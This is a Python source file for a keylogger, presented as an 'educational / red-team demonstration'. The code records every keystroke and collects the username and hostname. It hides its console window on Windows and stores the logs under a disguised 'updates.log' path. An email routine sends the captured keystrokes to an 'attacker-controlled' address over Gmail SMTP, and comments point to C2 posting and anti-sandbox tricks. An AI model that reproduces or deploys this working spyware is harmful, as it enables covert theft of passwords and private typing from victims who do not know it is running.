# keylogger_2025_style.py
# Educational / red-team demonstration only.
# Do NOT use this on any system you do not own or have explicit written permission to test.

import os
import platform
import threading
import datetime
import getpass
import socket
import logging
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("This demo requires pynput  →  pip install pynput")
    exit(1)

# ────────────────────────────────────────────────
#   CONFIGURATION – change these for your exercise
# ────────────────────────────────────────────────

REPORT_EVERY_SECONDS    = 60 * 5          # 5 minutes
SEND_VIA_EMAIL          = False           # requires smtplib credentials
SEND_VIA_HTTP           = False           # requires a real receiving server
SAVE_TO_LOCAL_FILE      = True
LOCAL_LOG_PATH          = Path.home() / "AppData" / "Roaming" / ".cache" / "updates.log"
                          # typical windows hiding places; change for linux/mac

HIDE_WINDOW             = True            # Windows only - attempts to hide console
SUPPRESS_KEYBOARD_ERRORS = True

# ────────────────────────────────────────────────

log_content = []
lock = threading.Lock()

def get_system_info():
    return {
        "timestamp_start": datetime.datetime.now().isoformat(),
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "architecture": platform.architecture()[0],
        "pid": os.getpid()
    }


def on_press(key):
    try:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

        if hasattr(key, "char") and key.char:
            char = key.char
        elif key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "[ENTER]\n"
        elif key == keyboard.Key.tab:
            char = "[TAB]"
        elif key == keyboard.Key.backspace:
            char = "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            char = "[ESC]"
        elif key == keyboard.Key.caps_lock:
            char = "[CAPS]"
        else:
            char = f"[{key.name.upper()}]"

        line = f"{ts}  {char}"
        with lock:
            log_content.append(line)

    except Exception as e:
        if not SUPPRESS_KEYBOARD_ERRORS:
            with lock:
                log_content.append(f"[ERROR] {e}")


def on_release(key):
    if key == keyboard.Key.esc:
        # You can decide whether ESC should stop logging or not
        # return False   ← uncomment to stop listener on ESC
        pass


def periodic_report():
    while True:
        threading.Event().wait(REPORT_EVERY_SECONDS)

        with lock:
            if not log_content:
                continue

            data = "\n".join(log_content)
            log_content.clear()

        # Choose ONE or more output methods
        if SAVE_TO_LOCAL_FILE:
            try:
                LOCAL_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
                with open(LOCAL_LOG_PATH, "a", encoding="utf-8", errors="replace") as f:
                    f.write(f"\n\n=== {datetime.datetime.now().isoformat()} ===\n")
                    f.write(data)
                    f.write("\n")
            except Exception:
                pass

        if SEND_VIA_EMAIL:
            send_via_email(data)           # ← implement below if desired

        if SEND_VIA_HTTP:
            send_via_http_post(data)       # ← implement below if desired


def send_via_email(content):               # EXAMPLE – do NOT commit credentials!
    import smtplib
    from email.mime.text import MIMEText

    FROM    = "redteam.demo@gmail.com"
    TO      = "attacker-controlled@domain.tld"
    PASSWORD= "xxxx xxxx xxxx xxxx"        # app password if gmail

    msg = MIMEText(content)
    msg["Subject"] = f"Keylog {socket.gethostname()} {datetime.date.today()}"
    msg["From"] = FROM
    msg["To"] = TO

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(FROM, PASSWORD)
            server.sendmail(FROM, TO, msg.as_string())
    except:
        pass


def send_via_http_post(content):
    # You would normally POST to your C2 / webhook / Telegram bot here
    # requests.post("https://your-server/log", json={"data":content})
    pass


def hide_console_windows():
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


def main():
    if HIDE_WINDOW:
        hide_console_windows()

    sysinfo = get_system_info()
    first_line = f"STARTED | {sysinfo}"

    with lock:
        log_content.append(first_line)

    if SAVE_TO_LOCAL_FILE:
        try:
            LOCAL_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
            with open(LOCAL_LOG_PATH, "a", encoding="utf-8") as f:
                f.write(f"\n\n{first_line}\n")
        except:
            pass

    # Start periodic sender thread
    threading.Thread(target=periodic_report, daemon=True).start()

    # Start keyboard listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release,
        suppress=False
    ) as listener:
        listener.join()


if __name__ == "__main__":
    # Very basic anti-debug / anti-sandbox tricks students sometimes add:
    # if "VIRTUAL" in platform.node().upper() or os.getenv("USERNAME") in ["sandbox", "malware"]:
    #     exit(0)

    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        with open("keylogger_crash.log", "w") as f:
            f.write(str(e))